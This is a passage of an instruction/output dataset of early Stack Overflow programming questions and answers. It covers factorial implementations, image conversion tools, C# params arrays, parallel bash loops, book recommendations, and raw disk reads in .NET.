factorial(unsigned long long n);\nfactorial:\n    enter 0,0\n    ; n is placed in rdi by caller\n    mov rax, 1 ; factorial = 1\n    mov rcx, 2 ; i = 2\nloopstart:\n    cmp rcx, rdi\n    ja loopend\n    mul rcx ; factorial *= i\n    inc rcx\n    jmp loopstart\nloopend:\n    leave\n    ret"}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "ConvertICO.com has always worked fine for me."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "ImageMagick can convert practically any widely used image format to another.\nhttp://www.imagemagick.org/script/index.php\nsee http://www.imagemagick.org/script/convert.php in particular\nThere are ImageMagick bindigs for most popular languages."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "http://converticon.com/ is also a candidate."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "I don't know where I would be without IrFanView.  Fantastic for batch converting images, including ico to png."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "Note: This was free when this question was asked but apparently it's a\n  paid app now. @Sean Kearon should change the \"correct answer\" now.\n\nYou can use IcoFX ($59)\n\nIt is an all-in-one solution for icon\n  creation, extraction and editing. It\n  is designed to work with Windows XP,\n  Windows Vista and Macintosh icons\n  supporting transparency."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "This is probably a rather silly answer, but if you only need one icon, you could just take a screenshot of the icon in the folder and chop out the part you want. Make sure the icon is showing the size you want and has a white background, of course.\nIf you are using a decent screenshot application like SnagIt or WinSnap, a region snap should take care of it within a few seconds.\nNote that this won't give you transparency."}
{"instruction": "What tool(s) do you use to generate documentation for a database (preferably into a .chm help file)?", "output": "SQL Doc \nDocument SQL Server 2000, 2005 and 2008 databases\n\nDemo Video\nApex SQL Doc"}
{"instruction": "What tool(s) do you use to generate documentation for a database (preferably into a .chm help file)?", "output": "If you are on SQL Server 2000/2005 you can use DBdoc\n(SQL 2005 requires a patch that is listed in the comments below the article)\nIf you have money to spend, you can also use RedGate SQL doc (1.3 is the latest version). It offers (from the homepage):\n\nFast, simple database documentation\nDocument one or multiple databases,\ndown to object level\nWrite, edit, and export documentation in easy-to-read HTML files or .chm files for team distribution\nIncludes all cross-database dependencies"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Visual Basic: Linq\n<Extension()> _\nPublic Function Product(ByVal xs As IEnumerable(Of Integer)) As Integer\n    Return xs.Aggregate(1, Function(a, b) a * b)\nEnd Function\n\nPublic Function Fact(ByVal n As Integer) As Integer\n    Return Aggregate x In Enumerable.Range(1, n) Into Product()\nEnd Function\n\nThis shows how to use the Aggregate keyword in VB. C# can't do this (although C# can of course call the extension method directly)."}
{"instruction": "What tool(s) do you use to generate documentation for a database (preferably into a .chm help file)?", "output": "We use a wiki so that all developers can/should update it and it is a team effort. A tool that is makes it hard to share, and requires a central \"document\" will be hard to maintain.\nWhat really do you need? As long as you have a table with the DB schema, document the possible values of each column and their meaning (i.e 1=\"on hold\", 2=\"Canceled\") and then put a image of the main DB tables connected with the foreign keys (export from SQL Server 2005) you are good to go."}
{"instruction": "What is the best way to implement, from a web page a download action using asp.net 2.0?\nLog files for a action are created in a directory called [Application Root]/Logs.  I have the full path and want to provide a button, that when clicked will download the log file from the IIS server to the users local pc.", "output": "Does this help:\nhttp://www.west-wind.com/weblog/posts/76293.aspx\nResponse.ContentType = \"application/octet-stream\";\nResponse.AppendHeader(\"Content-Disposition\",\"attachment; filename=logfile.txt\");\nResponse.TransmitFile( Server.MapPath(\"~/logfile.txt\") );\nResponse.End();\n\nResponse.TransmitFile is the accepted way of sending large files, instead of Response.WriteFile."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "Free: @icon sushi is very good for working with icons:\nFeatures\n\nicon sushi can convert image files into icon files and vice versa.\nSupport for Windows Vista large icons. (convert large image with PNG compression)\nSupport for Windows XP 32bit Icons.\nSupport for Multiple-Icon which contains some icons in a file.\nEdit Alpha channel and Transparency-Mask.\nOpen 1x1 to 256x256 size of images.\nOpen 1/4/8/24/32bits color images.\nOpen: ICO/BMP/PNG/PSD/EXE/DLL/ICL, Convert into: ICO/BMP/PNG/ICL\nCopy to / Paste from Clipboard."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "If you'r not looking for something programmatic then just 'Print Screen' and crop."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "PowerShell\nfunction factorial( [int] $n ) \n{ \n    $result = 1; \n\n    if ( $n -gt 1 ) \n    { \n        $result = $n * ( factorial ( $n - 1 ) ) \n    } \n\n    $result \n}\n\nHere's a one-liner:\n$n..1 | % {$result = 1}{$result *= $_}{$result}"}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "There is an online conversion tool available at http://www.html-kit.com/favicon/. In addition to generating the .ico it will also give you an animated .gif version."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Recursive Prolog\nfac(0,1).\nfac(N,X) :- N1 is N -1, fac(N1, T), X is N * T.\n\nTail Recursive Prolog\nfac(0,N,N).\nfac(X,N,T) :- A is N * X, X1 is X - 1, fac(X1,A,T).\nfac(N,T) :- fac(N,1,T)."}
{"instruction": "What tool can I use to convert a .ICO file to a .PNG file?", "output": "Google has an ico to png converter, I saw it on reddit the other day.\nhttp://www.google.com/s2/favicons?domain=stackoverflow.com"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Bourne Shell: Functional\nfactorial() {\n  if [ $1 -eq 0 ]\n  then\n    echo 1\n    return\n  fi\n\n  a=`expr $1 - 1`\n  expr $1 \\* `factorial $a`\n}\n\nAlso works for Korn Shell and Bourne Again Shell. :-)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Lisp recursive:\n(defun factorial (x) \n   (if (<= x 1) \n       1 \n       (* x (factorial (- x 1)))))"}
{"instruction": "I want to show a chromeless modal window with a close button in the upper right corner.\nIs this possible?", "output": "You'll pretty much have to roll your own Close button, but you can hide the window chrome completely using the WindowStyle attribute, like this:\n<Window WindowStyle=\"None\">\n\nThat will still have a resize border. If you want to make the window non-resizable then add ResizeMode=\"NoResize\" to the declaration."}
{"instruction": "I want to show a chromeless modal window with a close button in the upper right corner.\nIs this possible?", "output": "<Window x:Class=\"WpfApplication1.Window1\"\n    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n    Title=\"Window1\" Height=\"300\" Width=\"300\" WindowStyle=\"None\" ResizeMode=\"NoResize\">\n    <Button HorizontalAlignment=\"Right\" Name=\"button1\" VerticalAlignment=\"Top\" >Close</Button>\n</Window>"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "JavaScript\nUsing anonymous functions:\nvar f = function(n){\n  if(n>1){\n    return arguments.callee(n-1)*n;\n  }\n  return 1;\n}"}
{"instruction": "I have developed a COM component (dll) that implements an Edit() method displaying a WTL modal dialog.\nThe complete interface to this COM component corresponds to a software standard used in the chemical process industry (CAPE-OPEN) and as a result this COM component is supposed to be usable by a range of 3rd party executables that are out of my control.\nMy component works as expected in many of these EXEs, but for one in particular the Edit() method just hangs without the dialog appearing.\nHowever, if I make a call to ::MessageBox() immediately before DoModal() the dialog displays and behaves correctly after first showing the MessageBox.\nI have a suspicion that the problem may be something to do with this particular EXE running as a 'hidden window application'.\nI have tried using both NULL and the return value from ::GetConsoleWindow() as the dialog's parent, neither have worked.\nThe dialog itself is an ATL/WTL CPropertySheetImpl.\nThe parent application (EXE) in question is out of my control as it is developed by a (mildly hostile) 3rd party.\nI do know that I can successfully call ::MessageBox() or display the standard Windows File Dialog from my COM component, and that after doing so I am then able to display my custom dialog. I'm just unable to display my custom dialog without first displaying a 'standard' dialog.\nCan anyone suggest how I might get it to display the dialog without first showing an unnecessary MessageBox? I know it is possible because I've seen this EXE display the dialogs from other COM components corresponding to the same interface.", "output": "Are you using a parent for the Dialog? e.g.\nMyDialog dialog(pParent);\ndialog.DoModal();\n\nIf you are, try removing the parent. Especially if the parent is the desktop window."}
{"instruction": "I have developed a COM component (dll) that implements an Edit() method displaying a WTL modal dialog.\nThe complete interface to this COM component corresponds to a software standard used in the chemical process industry (CAPE-OPEN) and as a result this COM component is supposed to be usable by a range of 3rd party executables that are out of my control.\nMy component works as expected in many of these EXEs, but for one in particular the Edit() method just hangs without the dialog appearing.\nHowever, if I make a call to ::MessageBox() immediately before DoModal() the dialog displays and behaves correctly after first showing the MessageBox.\nI have a suspicion that the problem may be something to do with this particular EXE running as a 'hidden window application'.\nI have tried using both NULL and the return value from ::GetConsoleWindow() as the dialog's parent, neither have worked.\nThe dialog itself is an ATL/WTL CPropertySheetImpl.\nThe parent application (EXE) in question is out of my control as it is developed by a (mildly hostile) 3rd party.\nI do know that I can successfully call ::MessageBox() or display the standard Windows File Dialog from my COM component, and that after doing so I am then able to display my custom dialog. I'm just unable to display my custom dialog without first displaying a 'standard' dialog.\nCan anyone suggest how I might get it to display the dialog without first showing an unnecessary MessageBox? I know it is possible because I've seen this EXE display the dialogs from other COM components corresponding to the same interface.", "output": "Depending on how the \"hidden window\" application works, it might not be able to display a window. For example, services don't have a \"main message loop\", and thus are not able to process messages sent to windows in the process. i.e, the application displaying the window should have something like this:\n    while(GetMessage(&msg, NULL, 0, 0))\n    {\n        if(!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) \n        {\n            TranslateMessage(&msg);\n            DispatchMessage(&msg);\n        }\n    }\n\nin WinMain."}
{"instruction": "I have developed a COM component (dll) that implements an Edit() method displaying a WTL modal dialog.\nThe complete interface to this COM component corresponds to a software standard used in the chemical process industry (CAPE-OPEN) and as a result this COM component is supposed to be usable by a range of 3rd party executables that are out of my control.\nMy component works as expected in many of these EXEs, but for one in particular the Edit() method just hangs without the dialog appearing.\nHowever, if I make a call to ::MessageBox() immediately before DoModal() the dialog displays and behaves correctly after first showing the MessageBox.\nI have a suspicion that the problem may be something to do with this particular EXE running as a 'hidden window application'.\nI have tried using both NULL and the return value from ::GetConsoleWindow() as the dialog's parent, neither have worked.\nThe dialog itself is an ATL/WTL CPropertySheetImpl.\nThe parent application (EXE) in question is out of my control as it is developed by a (mildly hostile) 3rd party.\nI do know that I can successfully call ::MessageBox() or display the standard Windows File Dialog from my COM component, and that after doing so I am then able to display my custom dialog. I'm just unable to display my custom dialog without first displaying a 'standard' dialog.\nCan anyone suggest how I might get it to display the dialog without first showing an unnecessary MessageBox? I know it is possible because I've seen this EXE display the dialogs from other COM components corresponding to the same interface.", "output": "This isn't supposed to be reliable - but try ::GetDesktopWindow() as the parent (it returns a HWND).\nBe warned - if your app crashes, it will bring down the desktop with it. But i'd be interested to see if it works."}
{"instruction": "I have developed a COM component (dll) that implements an Edit() method displaying a WTL modal dialog.\nThe complete interface to this COM component corresponds to a software standard used in the chemical process industry (CAPE-OPEN) and as a result this COM component is supposed to be usable by a range of 3rd party executables that are out of my control.\nMy component works as expected in many of these EXEs, but for one in particular the Edit() method just hangs without the dialog appearing.\nHowever, if I make a call to ::MessageBox() immediately before DoModal() the dialog displays and behaves correctly after first showing the MessageBox.\nI have a suspicion that the problem may be something to do with this particular EXE running as a 'hidden window application'.\nI have tried using both NULL and the return value from ::GetConsoleWindow() as the dialog's parent, neither have worked.\nThe dialog itself is an ATL/WTL CPropertySheetImpl.\nThe parent application (EXE) in question is out of my control as it is developed by a (mildly hostile) 3rd party.\nI do know that I can successfully call ::MessageBox() or display the standard Windows File Dialog from my COM component, and that after doing so I am then able to display my custom dialog. I'm just unable to display my custom dialog without first displaying a 'standard' dialog.\nCan anyone suggest how I might get it to display the dialog without first showing an unnecessary MessageBox? I know it is possible because I've seen this EXE display the dialogs from other COM components corresponding to the same interface.", "output": "It turns out I was mistaken:\n\nIf I create my dialog with a NULL parent then it is not displayed, and hangs the parent application\nHowever if I create my dialog with ::GetConsoleWindow() as the parent then the dialog is displayed; it just fooled me because it was displayed behind the window of the application that launched the parent application\n\nSo now I just have to find out how to bring my dialog to the front.\nThanks for the answers ;-)"}
{"instruction": "When performing string concatentation of an existing string in the intern pool, is a new string entered into the intern pool or is a reference returned to the existing string in the intern pool? According to this article, String.Concat and StringBuilder will insert new string instances into the intern pool? \nhttp://community.bartdesmet.net/blogs/bart/archive/2006/09/27/4472.aspx\nCan anyone explain how concatenation works with the intern pool?", "output": "If you create new strings, they will not automatically be put into the intern pool, unless you concatenate constants compile-time, in which case the compiler will create one string result and intern that as part of the JIT process."}
{"instruction": "When performing string concatentation of an existing string in the intern pool, is a new string entered into the intern pool or is a reference returned to the existing string in the intern pool? According to this article, String.Concat and StringBuilder will insert new string instances into the intern pool? \nhttp://community.bartdesmet.net/blogs/bart/archive/2006/09/27/4472.aspx\nCan anyone explain how concatenation works with the intern pool?", "output": "You can see whether a string has been interned by calling String.IsInterned. The call will return a new string that is either a reference to an interned string equal to the string that was passed as an argument, or null if the string was not interned."}
{"instruction": "I need to do a quick demo app using Google Maps (or Yahoo Maps, or any similar service).  So far I haven't had much luck finding .NET wrappers for any of these services.\nAny suggestions or pointers?\nI'm not opposed to using the native javascript api to do this, but I assumed someone would have already written a wrapper to easily integrate this into an ASP.NET application.", "output": "I always check CodePlex.com\nhttp://www.codeplex.com/googlemap\nhttp://www.codeplex.com/YahooMap\nThe GoogleMaps project above has a lot of good examples on the project leader's website."}
{"instruction": "This is a somewhat low-level question.  In x86 assembly there are two SSE instructions: \n\nMOVDQA xmmi, m128\n\nand  \n\nMOVNTDQA xmmi, m128\n\nThe IA-32 Software Developer's Manual says that the NT in MOVNTDQA stands for Non-Temporal, and that otherwise it's the same as MOVDQA.\nMy question is, what does Non-Temporal mean?", "output": "Espo is pretty much bang on target. Just wanted to add my two cents:\nThe \"non temporal\" phrase means lacking temporal locality. Caches exploit two kinds of locality - spatial and temporal, and by using a non-temporal instruction you're signaling to the processor that you don't expect the data item be used in the near future.\nI am a little skeptical about the hand-coded assembly that uses the cache control instructions. In my experience these things lead to more evil bugs than any effective performance increases."}
{"instruction": "What is the best way to create a lock on a file in Perl?\nIs it best to flock on the file or to create a lock file to place a lock on and check for a lock on the lock file?", "output": "CPAN to the rescue: IO::LockedFile."}
{"instruction": "I need to do a quick demo app using Google Maps (or Yahoo Maps, or any similar service).  So far I haven't had much luck finding .NET wrappers for any of these services.\nAny suggestions or pointers?\nI'm not opposed to using the native javascript api to do this, but I assumed someone would have already written a wrapper to easily integrate this into an ASP.NET application.", "output": "I've had good luck with this one:  http://www.shabdar.org/google-maps-user-control-for-ASP-Net-part1.html (assumes you have the ajax extensions at your disposal - this makes it easy to use but it might not be the best for performance)"}
{"instruction": "I have a method which takes params object[] such as:\nvoid Foo(params object[] items)\n{\n    Console.WriteLine(items[0]);\n}\n\nWhen I pass two object arrays to this method, it works fine:\nFoo(new object[]{ (object)\"1\", (object)\"2\" }, new object[]{ (object)\"3\", (object)\"4\" } );\n// Output: System.Object[]\n\nBut when I pass a single object[], it does not take my object[] as the first param, instead it takes its all elements like I wanted to pass them one by one:\nFoo(new object[]{ (object)\"1\", (object)\"2\" });\n// Output: 1, expected: System.Object[]\n\nHow do I pass a single object[] as a first argument to a params array?", "output": "The params parameter modifier gives callers a shortcut syntax for passing multiple arguments to a method. There are two ways to call a method with a params parameter:\n1) Calling with an array of the parameter type, in which case the params keyword has no effect and the array is passed directly to the method:\nobject[] array = new[] { \"1\", \"2\" };\n\n// Foo receives the 'array' argument directly.\nFoo( array );\n\n2) Or, calling with an extended list of arguments, in which case the compiler will automatically wrap the list of arguments in a temporary array and pass that to the method:\n// Foo receives a temporary array containing the list of arguments.\nFoo( \"1\", \"2\" );\n\n// This is equivalent to:\nobject[] temp = new[] { \"1\", \"2\" );\nFoo( temp );\n\n\nIn order to pass in an object array to a method with a \"params object[]\" parameter, you can either:\n1) Create a wrapper array manually and pass that directly to the method, as mentioned by lassevk:\nFoo( new object[] { array } );  // Equivalent to calling convention 1.\n\n2) Or, cast the argument to object, as mentioned by Adam, in which case the compiler will create the wrapper array for you:\nFoo( (object)array );  // Equivalent to calling convention 2.\n\n\nHowever, if the goal of the method is to process multiple object arrays, it may be easier to declare it with an explicit \"params object[][]\" parameter. This would allow you to pass multiple arrays as arguments:\nvoid Foo( params object[][] arrays ) {\n  foreach( object[] array in arrays ) {\n    // process array\n  }\n}\n\n...\nFoo( new[] { \"1\", \"2\" }, new[] { \"3\", \"4\" } );\n\n// Equivalent to:\nobject[][] arrays = new[] {\n  new[] { \"1\", \"2\" },\n  new[] { \"3\", \"4\" }\n};\nFoo( arrays );\n\n\nEdit: Raymond Chen describes this behavior and how it relates to the C# specification in a new post."}
{"instruction": "Lets say I have a loop in bash:\nfor foo in `some-command`\ndo\n   do-something $foo\ndone\n\ndo-something is cpu bound and I have a nice shiny 4 core processor. I'd like to be able to run up to 4 do-something's at once.\nThe naive approach seems to be:\nfor foo in `some-command`\ndo\n   do-something $foo &\ndone\n\nThis will run all do-somethings at once, but there are a couple downsides, mainly that do-something may also have some significant I/O which performing all at once might slow down a bit. The other problem is that this code block returns immediately, so no way to do other work when all the do-somethings are finished.\nHow would you write this loop so there are always X do-somethings running at once?", "output": "Instead of a plain bash, use a Makefile, then specify number of simultaneous jobs with make -jX where X is the number of jobs to run at once.\nOr you can use wait (\"man wait\"): launch several child processes, call wait - it will exit when the child processes finish.\nmaxjobs = 10\n\nforeach line in `cat file.txt` {\n jobsrunning = 0\n while jobsrunning < maxjobs {\n  do job &\n  jobsrunning += 1\n }\nwait\n}\n\njob ( ){\n...\n}\n\nIf you need to store the job's result, then assign their result to a variable. After wait you just check what the variable contains."}
{"instruction": "Lets say I have a loop in bash:\nfor foo in `some-command`\ndo\n   do-something $foo\ndone\n\ndo-something is cpu bound and I have a nice shiny 4 core processor. I'd like to be able to run up to 4 do-something's at once.\nThe naive approach seems to be:\nfor foo in `some-command`\ndo\n   do-something $foo &\ndone\n\nThis will run all do-somethings at once, but there are a couple downsides, mainly that do-something may also have some significant I/O which performing all at once might slow down a bit. The other problem is that this code block returns immediately, so no way to do other work when all the do-somethings are finished.\nHow would you write this loop so there are always X do-somethings running at once?", "output": "Maybe try a parallelizing utility instead rewriting the loop? I'm a big fan of xjobs. I use xjobs all the time to mass copy files across our network, usually when setting up a new database server.\nhttp://www.maier-komor.de/xjobs.html"}
{"instruction": "Is is possible to read a disk directly with .Net?  By directly I mean via the device bypassing the file system.  I think I would go about this by opening the device some way \"\\Device\\Ide\\IdeDeviceP2T0L0-1\" for example. \nIf I can't open the device with a .NET api knowing which Win32 API to use would be helpful.", "output": "CreateFile has support for direct disk access. Read the notes under \"Physical Disks and Volumes\". You should be able to P/Invoke the call.\nNote that Vista and Server 2008 have severely restricted this."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Inmates Are Running the Asylum\nby Alan Cooper\n\nIt's about using the right language to talk about projects - using stories (and personas) instead of 'features' to talk about stuff that needs to be realized. Also a lot of emphasis on interaction design and related activities. Delivering what is needed instead of what is asked for."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "I think this was covered pretty well in another question (Best non-development book for software developers)."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Mythical Man-Month\nby Fred Brooks"}
{"instruction": "Lets say I have a loop in bash:\nfor foo in `some-command`\ndo\n   do-something $foo\ndone\n\ndo-something is cpu bound and I have a nice shiny 4 core processor. I'd like to be able to run up to 4 do-something's at once.\nThe naive approach seems to be:\nfor foo in `some-command`\ndo\n   do-something $foo &\ndone\n\nThis will run all do-somethings at once, but there are a couple downsides, mainly that do-something may also have some significant I/O which performing all at once might slow down a bit. The other problem is that this code block returns immediately, so no way to do other work when all the do-somethings are finished.\nHow would you write this loop so there are always X do-somethings running at once?", "output": "maxjobs=4\nparallelize () {\n        while [ $# -gt 0 ] ; do\n                jobcnt=(`jobs -p`)\n                if [ ${#jobcnt[@]} -lt $maxjobs ] ; then\n                        do-something $1 &\n                        shift  \n                else\n                        sleep 1\n                fi\n        done\n        wait\n}\n\nparallelize arg1 arg2 \"5 args to third job\" arg4 ..."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "How to Win Friends and Influence People\nby Dale Carnegie\n\nAlthough this was first published in 1936, the advice contained within is still as fresh and appropriate as ever. Don't be put off by the name. This isn't some underhand guide to having your way with unsuspecting victims, but rather common sense advice on how to get on with people, how to nurture relationships and make the most of yourself and your fellow man (and woman).\nIt is well known that technical folk (including programmers) are often thought of as not being terribly 'people oriented' (whether this is a justified stereotype or not is subject of another discussion) and so this book is an invaluable resource for teaching you the finer points of human interaction.\nIt's warm, heartfelt, sturdy, straightforward and timelessly written. Highly recommended."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Jeffrey K. Liker - The Toyota Way (Amazon link). A good if at times semi-boring read, but loads of information from the company which invented Lean."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "My recommendation would be: read anything that is outside your usual scope.\nReally - anything will broaden your horizon. This does not only apply to programmers and developers. I think everyone would do better having an interest in something that you don't already spend 8-12 hours a day.\nPersonally, I sometimes feel like a real world idiot because my personal library of books on all kind of topics related to computers is growing and growing and I can never relax - I mean, I spend roughly 10 hours a day with them and then I am reading a book on design patterns before I go to bed. How sick is that? ;)\nMy current refuge is my newspaper subscription, and various other magazines I pick up every so often when I go by a news stand. Most of them have nothing to do with technology and programming. I made a habit going out for a coffee in the morning, taking the newspaper along and reading something else, or meeting friends and just chatting away.\nSo, just to make it more clear - I know that a newspaper or any magazine is not as current and up to date as a website. But this allows me to not read it on a screen and do something outside the usual."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Getting Things Done\nby David Allen."}
{"instruction": "Is is possible to read a disk directly with .Net?  By directly I mean via the device bypassing the file system.  I think I would go about this by opening the device some way \"\\Device\\Ide\\IdeDeviceP2T0L0-1\" for example. \nIf I can't open the device with a .NET api knowing which Win32 API to use would be helpful.", "output": "Cool, thank you Mark, I had forgotten that CreateFile opens things too.  I was looking at the volume management API and not seeing how to open things.  \nHere is a little class that wraps things up.  It might also be possible/correct to just pass the SafeFileHandle into a FileStream.\nusing System;\nusing System.Runtime.InteropServices;\nusing System.IO;\nusing Microsoft.Win32.SafeHandles;\n\nnamespace ReadFromDevice\n{\n    public class DeviceStream : Stream, IDisposable\n    {\n        public const short FILE_ATTRIBUTE_NORMAL = 0x80;\n        public const short INVALID_HANDLE_VALUE = -1;\n        public const uint GENERIC_READ = 0x80000000;\n        public const uint GENERIC_WRITE = 0x40000000;\n        public const uint CREATE_NEW = 1;\n        public const uint CREATE_ALWAYS = 2;\n        public const uint OPEN_EXISTING = 3;\n\n        // Use interop to call the CreateFile function.\n        // For more information about CreateFile,\n        // see the unmanaged MSDN reference library.\n        [DllImport(\"kernel32.dll\", SetLastError = true, CharSet = CharSet.Unicode)]\n        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,\n          uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,\n          uint dwFlagsAndAttributes, IntPtr hTemplateFile);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        private static extern bool ReadFile(\n            IntPtr hFile,       